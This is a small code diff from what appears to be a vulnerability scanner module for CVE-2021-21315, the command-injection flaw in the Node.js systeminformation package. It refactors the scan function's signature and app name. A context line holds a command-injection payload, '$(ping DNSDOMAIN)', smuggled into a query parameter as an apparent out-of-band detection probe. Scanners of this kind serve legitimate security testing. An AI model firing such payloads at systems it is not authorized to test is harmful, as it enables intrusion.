@@ -14,7 +14,7 @@ cve_2021_21315_payloads = [
     {'path': 'getServices?name[]=$(ping DNSDOMAIN)'}
 ]
 
-def cve_2021_21315_scan(self, clients):
+def cve_2021_21315_scan(clients):
     ''' Node.js库中的systeminformation软件包中存在一个命令注入漏洞, 
         攻击者可以通过在未经过滤的参数中注入Payload来执行系统命令
     '''
@@ -22,7 +22,7 @@ def cve_2021_21315_scan(self, clients):
     sessid = 'ea16de03573ce0c2f731fa40de93ecd7'
 
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'Node.js',
         'vul_type': 'RCE',
         'vul_id': 'CVE-2021-21315',
     }
